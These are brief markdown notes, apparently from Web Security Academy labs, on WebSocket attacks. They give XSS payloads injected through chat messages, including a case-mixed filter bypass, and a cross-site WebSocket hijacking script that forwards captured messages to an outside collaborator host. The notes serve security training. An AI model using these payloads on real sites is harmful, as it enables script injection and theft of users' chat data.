# WebSocket Vulnerabilities

### Manipulating WebSocket messages to exploit vulnerabilities
* Attack Vector
```html
<form id="chatForm" action="wss://ac2c1f411fac5042c0e80df200df001b.web-security-academy.net/chat" encode="true">
```
* Payload
```json
{"message" : "<img src=1 onerror='alert(1)'>"}
```

### Manipulating the WebSocket handshake to exploit vulnerabilities
* Attack Vector
```html
<form id="chatForm" action="wss://ac2c1f411fac5042c0e80df200df001b.web-security-academy.net/chat" encode="true">
```
* Payload
```json
{"message" : "<img src=1 oNeRrOr=alert`1`>"}
```

### Cross-site WebSocket hijacking
* First we need to check whether there is no CSRF token implenented when establishing WebSocket
* Payload
```html
<script>
  var ws = new WebSocket('wss://ac801f771ee6b866c05f4cd400ab0032.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://s1u3ivhsytkn69c7b986lqfuslybm0.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
  };
</script> 
```
